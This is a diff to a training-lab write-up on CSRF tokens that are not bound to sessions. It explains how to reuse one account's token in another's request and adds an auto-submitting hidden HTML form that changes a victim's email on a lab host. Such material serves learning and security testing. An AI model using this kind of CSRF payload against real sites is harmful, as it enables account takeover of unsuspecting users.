@@ -35,7 +35,7 @@ Description of this lab: use your exploit server to host an HTML page that uses 
 Note: This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
 
 We will need 2 browsers for this lab:
- - Browser 1: log in with `carlos:montoya` and change email, website will generate valid token in payload, like this `email=demo%40demo.demo&csrf=WTvWupXdfWayFeCnkI61Wjz40gY3GaVf`. However, every token can use only one time, drop request change email with burp intercept. Check the code, and we can see that:
+ - Browser 1: log in with `carlos:montoya` and change email, website will generate valid token in payload, like this `email=demo%40demo.demo&csrf=WTvWupXdfWayFeCnkI61Wjz40gY3GaVf`. However, every token can use only one time, so if you want to use token, reload page again. Check the code, and we can see that:
 
  ```html
     <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
@@ -46,8 +46,18 @@ We will need 2 browsers for this lab:
     </form>
  ```
 
- - Browser 2: log in with `wiener:peter`, send the update email request into Burp Repeater and replace its token by token of browser 1, do the same as lab 1.
+ - Browser 2: log in with `wiener:peter`, send the update email request into Burp Intercept and replace its token by token of browser 1, you can see this modified request changing wiener's email.
+ Go back to browser 1, and reload page, copy its token in code, then using this in exploit server with below script.
 
+ ```html
+    <form action="https://0a2b005504f730f7c2a8028100f2007c.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="test&#64;example&#46;com">
+        <input type="hidden" name="csrf" value="ORVMYq9vt8rwzDakiea2fjBT3kqPT4iy">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+ ```
 
 ## No unpredictable request parameters
 
